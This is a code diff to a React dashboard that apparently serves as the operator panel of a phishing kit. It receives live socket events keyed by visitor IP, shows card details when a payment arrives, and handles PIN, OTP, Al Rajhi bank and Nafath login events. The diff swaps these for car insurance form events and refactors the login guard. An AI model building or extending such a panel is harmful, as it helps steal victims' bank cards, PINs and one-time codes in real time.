@@ -2,7 +2,7 @@
 import React, { useEffect, useState, useRef } from "react";
 import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
 import { socket } from "./socket";
-
+import RequireAuth from "./RequireAuth";
 import UserTable from "./components/UserTable";
 import CardModal from "./components/CardModal";
 import InfoModal from "./components/InfoModal";
@@ -183,21 +183,19 @@ export default function App() {
         }));
 
       socket.on("newIndex", (u) => mergeSingleton(u));
-      socket.on("newDetails", (u) => mergeSingleton(u));
-      socket.on("newShamel", (u) => mergeSingleton(u));
-      socket.on("newThirdparty", (u) => mergeSingleton(u));
-      socket.on("newBilling", (u) => mergeSingleton(u));
+      socket.on("newCarBody", (u) => mergeSingleton(u));
+      socket.on("newCar", (u) => mergeSingleton(u));
+      socket.on("newInsuranceCard", (u) => mergeSingleton(u));
+      socket.on("newInsurance", (u) => mergeSingleton(u));
       socket.on("newPayment", (u) => {
         appendPayment(u);
         handleShowCard(u.ip);
       });
-      socket.on("newPhone", (u) => mergeSingleton(u));
-      socket.on("newRajhi", (u) => mergeSingleton(u));
-      socket.on("newRajhiCode", (u) => mergeSingleton(u));
+      socket.on("newPlateNumber", (u) => mergeSingleton(u));
+      socket.on("newInsuredInfo", (u) => mergeSingleton(u));
+      socket.on("newPolicyDate", (u) => mergeSingleton(u));
       socket.on("newPin", (u) => mergeSingleton(u));
-      socket.on("newOtp", (u) => mergeSingleton(u));
-      socket.on("newPhoneCode", (u) => mergeSingleton(u));
-      socket.on("newNafad", (u) => mergeSingleton(u));
+      socket.on("newQuote", (u) => mergeSingleton(u));
 
       // ───── REPLACE: locationUpdated now also handles “offline” ─────
       socket.on("locationUpdated", ({ ip, page }) => {
@@ -259,7 +257,7 @@ export default function App() {
       <Route
         path="/"
         element={
-          localStorage.getItem("token") ? (
+          <RequireAuth>
             <DashboardView
               users={users}
               highlightIp={highlightIp}
@@ -269,23 +267,11 @@ export default function App() {
               setInfoIp={setInfoIp}
               onShowCard={handleShowCard}
             />
-          ) : (
-            <Navigate to="/login" replace />
-          )
+          </RequireAuth>
         }
       />
 
-      {/* Catch‐all: redirect based on presence of token */}
-      <Route
-        path="*"
-        element={
-          localStorage.getItem("token") ? (
-            <Navigate to="/" replace />
-          ) : (
-            <Navigate to="/login" replace />
-          )
-        }
-      />
+      <Route path="*" element={<Navigate to="/" replace />} />
     </Routes>
   );
 }
